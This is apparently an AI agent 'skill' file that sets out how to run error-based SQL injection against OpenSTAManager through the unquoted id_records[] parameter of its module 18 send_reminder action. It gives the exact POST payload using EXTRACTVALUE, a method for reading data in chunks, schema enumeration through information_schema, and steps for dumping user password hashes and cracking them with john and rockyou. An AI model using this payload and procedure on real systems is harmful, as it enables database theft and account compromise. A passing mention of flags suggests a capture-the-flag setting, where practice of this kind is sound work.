---
name: openstamanager-sqli
description: Extract data from OpenSTAManager via error-based SQLi.
---

# OpenSTAManager error-based SQL extraction

Use when an OpenSTAManager instance is exploited via the scadenzario bulk handler (module 18, `op=send_reminder`), which implodes `id_records[]` POST values unquoted into an `IN (...)` clause. Works wherever a numeric POST array reaches an unquoted SQL context.

## Payload shape

```
POST /actions.php?id_module=18
op=send_reminder&id_records[]=1) AND EXTRACTVALUE(1,CONCAT(0x3a,(<query>))) AND (1=1&distinta=x
```

The XPATH error message echoes the concatenated value: parse `XPATH syntax error: <value>` from the response body (HTML-entity-decode it).

## Chunked reads (EXTRACTVALUE truncates at 32 chars)

Read long values with `SELECT SUBSTRING((<query>),N,31)` chunks until a chunk comes back short or NULL; reassemble. For enumeration use `GROUP_CONCAT(... SEPARATOR ' ')` on `information_schema.tables`/`columns` (chunk-read those too), then targeted `SELECT`s per row.

## High-value targets and interpretation

- `zz_users.username` / `zz_users.password` hold bcrypt hashes — read the full 60 chars in two chunks and hand to john with rockyou.
- `@@secure_file_priv` often restricts `LOAD_FILE`/`INTO OUTFILE` to a server-side dir you cannot fetch over HTTP; do not plan file-read/write through MySQL before checking it.
- `information_schema.user_privileges` shows the connecting user's grants (a web user may have only USAGE, killing INTO OUTFILE plans).
- Presence checks over many tables: `SELECT COUNT(*) FROM t WHERE col REGEXP '[0-9a-fA-F]{32}'` per text column — count > 0 flags a flag/hash hit; scan note/description columns first rather than dumping everything.
- Non-numeric error text on a query usually means a wrong column/table name or quoting — dump the schema first, do not blind-guess.
- The response may be an empty 200 when the bulk op short-circuits (no matching rows): include at least one valid id or verify with a `SELECT 1` payload before trusting silence.
